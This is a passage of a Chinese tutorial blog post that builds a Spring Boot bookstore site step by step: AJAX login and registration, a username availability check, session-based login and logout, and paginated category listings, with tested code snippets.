class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/book/index&quot;</span>;</span><br><span class="line">            &#125;  <span class="keyword">else</span> <span class="keyword">if</span>(data == <span class="number">101</span>) &#123;</span><br><span class="line">                $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ajax异步发送post请求，url路径为web应用路径+&#x2F;user&#x2F;login，对表单进行序列化后传递数据，登录成功跳转到&#x2F;book&#x2F;index</p><p>把login_reg.js嵌入到index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/js/login_reg.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>register也一样</p><p>下面细化一些功能：</p><h3 id="注册用户名是否重复的验证"><a href="#注册用户名是否重复的验证" class="headerlink" title="注册用户名是否重复的验证"></a>注册用户名是否重复的验证</h3><p>在注册用户名处添加一个功能：光标移出输入框时，自动验证用户名是否存在，用onblur事件实现，this指当前元素自身，也就是username</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">required</span> <span class="attr">placeholder</span>=<span class="string">&quot;小写字母开头,不含中文.&quot;</span> <span class="attr">th:onblur</span>=<span class="string">&quot;|checkUser(this)|&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>checkUser的实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/checkUserName&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:&#123;<span class="string">&quot;username&quot;</span>:obj.<span class="property">value</span>&#125;,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="number">102</span>) &#123;<span class="comment">//用户存在</span></span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;用户名不合法&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;用户名可以注册&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中success:function的部分：这是一个 AJAX 请求的回调函数，当请求成功时会执行此函数。</p></blockquote><p>后端部分，同样的，需要连接数据库，和前面图书的实体类一样，用@Data自动生成getter和setter，@TableName指定数据表，IdType.AUTO自增主键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;bs_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId(type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并建立其mapper和service:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就不在controller写验证了，在业务层的service写也可以</p><p>同样的，注册Mapper，然后用mybatis提供的selectOne方法在数据库中进行查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkUser</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectOne(queryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;101&quot;</span>;<span class="comment">//用户名不重复</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;102&quot;</span>;<span class="comment">//用户已存在</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在controller里调用一下service的方法，并把结果（”101”或”102”）写进responseBody:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/checkUserName&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkUserName</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.checkUser(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在前端根据101或102就能显示不同的信息了</p><ul><li>测试：</li></ul><p>数据库中现在有的用户如下：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201007371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201007371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514201007371"></p><p>输入一个数据库中没有的用户，然后离开输入框：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514200929817.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514200929817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514200929817"></p><p>输入数据库中有的jack用户，然后离开输入框：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201155674.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201155674.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514201155674"></p><h3 id="注册信息"><a href="#注册信息" class="headerlink" title="注册信息"></a>注册信息</h3><p>类似于checkUserName，registry的前端写法几乎一模一样,把regForm表单的数据序列化后进行传递：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">register</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> datas = $(<span class="string">&quot;#regForm&quot;</span>).<span class="title function_">serialize</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/register&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:datas,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(data == <span class="string">&#x27;success&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;注册成功，请登录！&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#register&quot;</span>).<span class="title function_">modal</span>(<span class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后端也是，关键的就一步，把接收到的user类通过userService.save()写入数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">register</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        userService.save(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204340322.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204340322.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514204340322"></p><p>在navicat刷新可以看到：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204630356.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204630356.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514204630356"></p><p>控制台有相应的查询和插入的sql语句：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204707357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204707357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514204707357"></p><p>（后期改造：密码改为hash存储，登录改为hash校验）</p><h2 id="登录功能（session持久化）"><a href="#登录功能（session持久化）" class="headerlink" title="登录功能（session持久化）"></a>登录功能（session持久化）</h2><p>ajax提交表单跟注册一样，不过登录只需要两个input，一个username，一个password</p><p>在UserService加登录验证：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">loginCheck</span><span class="params">(User loginUser)</span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;username&quot;</span>,loginUser.getUsername());</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectOne(queryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;101&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(loginUser.getPassword().equals(user.getPassword())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;102&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中101对应用户名错误，100对应登录成功，102对应密码错误</p><p>相应的，在js的代码上，根据返回值的不同，100就登录成功，跳转至首页，101就改变用户名的css，密码错误就改变密码的提示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户登录</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> datas = $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">serialize</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/login&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:datas,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(data == <span class="number">100</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#loginModal&quot;</span>).<span class="title function_">modal</span>(<span class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/book/index&quot;</span>;</span><br><span class="line">            &#125;  <span class="keyword">else</span> <span class="keyword">if</span>(data == <span class="number">101</span>) &#123;</span><br><span class="line">                $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试：</li></ul><p>还是之前的数据库用户，有用户名为jack，密码为123456的用户</p><p>输入不存在的用户：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212615897.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212615897.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514212615897"></p><p>输入错误的密码：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212631022.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212631022.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514212631022"></p><p>输入正确的账户密码：会直接跳转至首页，这个时候就发现了一个问题，我没有做持久化的登录校验，所以验证成功了就没有后续了，页面没有发生任何改变</p><ul><li>做持久化，就把登录成功的信息写进session:</li></ul><p>登录成功后，就把整个user对象放进session</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(loginUser.getPassword().equals(user.getPassword())) &#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登陆成功后，这里就把导航栏的登录和注册换掉了：</p><p>session为空的时候才显示登录和注册，session不为空说明已经登录成功，则应该显示用户名，还有退出登录的按钮。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213604285.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213604285.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514213604285"></p><p>加上logout的功能：</p><p>调用session.invalidate()将session置空，这样就退出登录了，然后使用redirect重定向至首页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/logout&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">logout</span><span class="params">(HttpSession session)</span>&#123;</span><br><span class="line">    session.invalidate();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/home/index&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试：未登录时：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213826101.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213826101.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514213826101"></p><p>登陆后：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514214954698.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514214954698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230514214954698"></p><h2 id="图书类型（分类展示）"><a href="#图书类型（分类展示）" class="headerlink" title="图书类型（分类展示）"></a>图书类型（分类展示）</h2><p>在首页的导航栏里，这三个功能还未实现：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518091427407.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518091427407.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230518091427407"></p><ul><li>如精选图书页：</li></ul><p>导航菜单用th:href跳转到新页</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;books_list.html&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/book/bookList(category=1)&#125;&quot;</span>&gt;</span>精选图书<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在BookController下，分类当然要根据定义的category来分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/bookList&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">bookList</span><span class="params">(String category,Model model)</span>&#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;books_list&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在books_list，类似首页图书展示，做一个分类的图书展示，请求getBookListData，然后在getBookListData中做具体的图书展示，booklist就做除图书信息外该页其他内容的展示（如轮播，导航栏等）</p><p>category来自model.addAttribute，并用页数等于1，pagesize等于空来初始化查询第一页的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> category = [[$&#123;category&#125;]];</span><br><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   $(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,category))</span><br><span class="line">         &#125;)</span><br></pre></td></tr></table></figure><p>包装一下queryData参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">queryData</span>(<span class="params">page, pageSize, category</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> query = &#123;&#125;;</span><br><span class="line">   query.<span class="property">category</span> = category;</span><br><span class="line">   query.<span class="property">page</span> = page;<span class="comment">//存储着当前页数</span></span><br><span class="line">   query.<span class="property">pageSize</span> =pageSize == <span class="string">&#x27;&#x27;</span> ? <span class="number">4</span> : pageSize;<span class="comment">//一页显示几个</span></span><br><span class="line">   <span class="keyword">return</span> query;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>具体的分页功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getBookListData&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getBookListData</span><span class="params">(String category,Integer page, Integer pageSize, Model model)</span>&#123;</span><br><span class="line">    QueryWrapper&lt;Book&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">    IPage&lt;Book&gt; iPage = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;Book&gt;(page,pageSize),queryWrapper);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pre&quot;</span>,iPage.getCurrent() - <span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;next&quot;</span>,iPage.getCurrent() + <span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;cur&quot;</span>,iPage.getCurrent());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pages&quot;</span>,iPage.getPages());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pageSize&quot;</span>,pageSize);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;booksListData&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后续的内容都和首页展示一样了。</p><p>首页，上一页，下一页，尾页都通过loadData实现，比如首页，传递上参数就ok，loadData逻辑在主页写过了，这里只需要多加一个参数，也就是页码数，来控制翻页</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">loadData</span>(<span class="number">1</span>,[[$&#123;category&#125;]])</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadData</span>(<span class="params">page,pageSize,category</span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(page,pageSize,category))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳转到指定页，同样的，获取到表单输入的inputPage，作为参数传递到getBookListData，然后经过getBookListData处理后，传递到前端getBookListData.html进行展示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">goPage</span>(<span class="params">pageSize,category</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> page = $(<span class="string">&quot;#inputPage&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">             $(<span class="string">&quot;#bookList&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookListData&quot;</span>,<span class="title function_">queryData</span>(page,pageSize,category))</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>前端的上一页按钮：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;disabled&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;loadData([[$&#123;pre&#125;]],[[$&#123;pageSize&#125;]],[[$&#123;category&#125;]])&quot;</span>&gt;</span><span class="symbol">&amp;laquo;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下一页就把pre改为next</p><ul><li>跳转到某页</li></ul><p>搜索按钮：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 